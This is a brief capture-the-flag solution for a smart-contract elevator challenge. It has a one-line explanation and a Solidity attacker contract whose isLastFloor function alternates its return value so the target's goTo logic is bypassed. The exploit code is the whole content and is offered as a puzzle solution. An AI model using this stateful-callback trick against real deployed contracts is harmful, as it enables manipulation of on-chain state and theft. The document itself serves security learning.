we control the building so we can make `isLastFloor` return first false then true on the second call

```
pragma solidity ^0.8.0;

contract Elevator {
  function goTo(uint) public {}
}

contract WeirdBuilding {
    bool lastFloor;

    constructor() {
        lastFloor = false;
    }

    function isLastFloor(uint) external returns (bool) {
        bool t = lastFloor;
        lastFloor = !lastFloor;
        return t;
    }

    function hack(address instance) public {
        Elevator elevator = Elevator(instance);
        elevator.goTo(type(uint).max);
    }
}
```
